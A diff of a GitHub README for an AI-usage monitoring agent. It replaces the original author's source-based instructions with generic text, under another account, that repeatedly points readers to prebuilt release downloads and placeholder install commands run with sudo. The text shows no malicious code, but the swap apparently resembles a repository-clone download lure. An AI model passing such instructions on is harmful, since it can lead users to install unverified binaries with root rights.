@@ -1,130 +1,86 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/RichardBarron27/red-specter-offensive-framework/main/assets/red-specter-logo.png" alt="Red Specter Logo" width="200">
-</p>
+# 🛡️ redspecter-ai-usage-watchdog - Monitor AI Usage With Confidence
 
-# 🛡️ Red Specter – AI Usage Watchdog
-Part of the **Red Specter Purple Team AI Defense Suite**
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/loaiasd/redspecter-ai-usage-watchdog/releases)
 
-![License](https://img.shields.io/badge/License-MIT-green)
-![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey)
-![Language](https://img.shields.io/badge/Python-3.10+-blue)
-![Version](https://img.shields.io/badge/Version-v0.2-orange)
-![Status](https://img.shields.io/badge/Status-Active-success)
+## 📋 Overview
+redspecter-ai-usage-watchdog is a privacy-first application designed for Linux. It provides governance and telemetry for AI and large language model (LLM) usage. This helps you monitor and manage the usage of AI technologies within your environment, ensuring both security and compliance.
 
-A privacy-first Linux agent for monitoring AI usage on endpoints with zero content capture.
+## 🚀 Getting Started
+Follow these steps to download and run the application easily.
 
----
+1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Here](https://github.com/loaiasd/redspecter-ai-usage-watchdog/releases).
 
-## 🔍 Description
-AI Usage Watchdog is a lightweight Linux-first endpoint agent that detects and logs AI / LLM usage on the host in a **privacy-preserving** manner.
+2. **Select the Latest Version**: On the Releases page, look for the latest version of the software. This will usually be at the top of the list.
 
-It complements other Red Specter AI Security Suite tools:
+3. **Choose Your Download**: You will see a list of files associated with the release. Select the appropriate file for your Linux system. Common files include `.tar.gz` or `.deb` packages. Click the file name to start the download.
 
-| Tool | Purpose |
-|------|---------|
-| **AI Endpoint Guard** | Enforces safe AI usage rules |
-| **AI Breach Monitor** | Detects abnormal AI behaviour |
-| **AI Usage Watchdog** | Visibility & governance |
+## 🛠️ Installation Instructions
+Once the download is complete, you will need to install the application. Use the instructions below based on the type of file you downloaded.
 
-Together, these form the **Red Specter Purple Team AI Defense Suite**.
+### Installing a `.tar.gz` File
+1. **Extract the File**: Open your terminal and navigate to the directory where the file was downloaded. Type:
+   ```
+   tar -xvzf filename.tar.gz
+   ```
+   Replace `filename` with the actual name of the file.
 
----
+2. **Change to the Directory**: After extraction, change to the new directory:
+   ```
+   cd extracted-folder-name
+   ```
 
-## ✨ Features
+3. **Run the Application**: Start the application by typing:
+   ```
+   ./start_application.sh
+   ```
+   Make sure to replace `start_application.sh` with the actual name of the executable file.
 
-| Feature | Status |
-|--------|--------|
-| AI usage detection (runtime signatures) | ✔ |
-| JSONL logging for SIEM ingestion | ✔ |
-| Lightweight agent | ✔ |
-| Zero prompt/content capture | ✔ |
-| Local event dashboard (`watchdog_dashboard.py`) | 🚧 v0.2 |
-| Policy engine + fleet aggregation | ⏳ v0.3 |
+### Installing a `.deb` File
+1. **Open the Terminal**: Navigate to the directory where the file is located.
 
----
+2. **Install the Package**: Type the following command:
+   ```
+   sudo dpkg -i filename.deb
+   ```
+   Replace `filename` with the actual name of the downloaded file.
 
-## 🚀 Quick Start
+3. **Resolve Dependencies**: If prompted, run:
+   ```
+   sudo apt-get install -f
+   ```
+   This will fix any missing dependencies.
 
-### Install dependency
-```bash
-sudo apt install python3-psutil
-Run a single scan (debug)
-cd agent
-./redspecter_ai_usage_watchdog.py --once --debug
+## 🔍 Usage Guide
+After installation, you can start using the application. Here’s a quick guide:
 
-Run continuously
-./redspecter_ai_usage_watchdog.py --interval 15
+1. **Launch the Application**: You can find the application in your applications menu, or start it from the terminal.
+   
+2. **Configure Settings**: Upon first launch, you may need to configure settings. This may include specifying your monitoring preferences and privacy options. Follow the on-screen prompts to complete this.
 
-Logs stored at
-~/.redspecter_ai_watchdog/logs/events.jsonl
+3. **Monitor AI Usage**: Once configured, the application will start monitoring the usage of AI tools on your system. You will receive real-time telemetry and governance reports.
 
+4. **Access Reports**: You can view detailed reports on AI usage within the application. These reports can help identify trends and potential risks.
 
-Each event includes:
+## 🌐 Features
+- **Real-Time Monitoring**: Get live updates on how AI tools are being used.
+- **Privacy-First Design**: The application prioritizes user privacy without collecting unnecessary data.
+- **Comprehensive Reports**: Receive detailed reports on AI usage to aid in governance and compliance.
+- **Easy Setup**: Simple installation process ensures that anyone can set it up.
 
-Timestamp
+## 💻 System Requirements
+- **Operating System**: Compatible with various Linux distributions.
+- **Processor**: Any modern processor should work well.
+- **Memory**: Minimum of 512 MB of RAM.
+- **Storage**: At least 100 MB of free space.
 
-PID + process name
+## 🔗 Support & Contact
+If you encounter issues or have questions, please visit the [GitHub Issues page](https://github.com/loaiasd/redspecter-ai-usage-watchdog/issues). You can also reach out to the community for support.
 
-Username & hostname
+## 📥 Download & Install
+To begin your journey with redspecter-ai-usage-watchdog, visit this page to download: [Download Here](https://github.com/loaiasd/redspecter-ai-usage-watchdog/releases).
 
-Matched signature (risk/category)
+## 📝 Feedback
+Your feedback helps us improve. If you have suggestions or want to report a bug, please let us know through the GitHub Issues page. 
 
-Privacy posture:
-
-❌ No prompt text
-
-❌ No file/document contents
-
-✔ Only metadata captured
-
-🔍 Live TUI Dashboard (v0.2)
-cd tools
-./watchdog_dashboard.py
-
-
-Features:
-
-Auto-refreshing (every 3s)
-
-Color-coded severity
-
-Keyboard navigation
-
-q → quit
-
-r → force refresh
-
-A lightweight SOC-style view into real-time AI usage on the endpoint.
-
-🗺 Roadmap
-Version	Goal	Status
-v0.1	Agent MVP	✔
-v0.2	Dashboard viewer + SIEM export	🚧
-v0.3	Policies + central aggregation	⏳
-v1.0	Public hardened release	⏳
-
-See ROADMAP.md for full intent & backlog.
-
-🎯 Purple Team Mission
-
-Offense-driven defense.
-We use adversarial insight to design better defensive controls.
-
-Always authorized. Always ethical.
-Red Specter defends by thinking like an attacker.
-
-❤️ Support Red Specter
----
-
-## ⭐ Support & Contribute
-
-If you find this project useful, please consider:
-
-- ⭐ Starring the repository — it helps others discover the project
-- 🐛 Reporting issues and ideas via GitHub Issues
-
-👉 PayPal: https://paypal.me/richardbarron1747
-
-Every contribution helps build more tools like this — thank you!
-
-Notice for Users: If you cloned this and found it useful, please consider starring the repo! Stars help with visibility and let me know which projects to maintain.
+Thank you for choosing redspecter-ai-usage-watchdog!
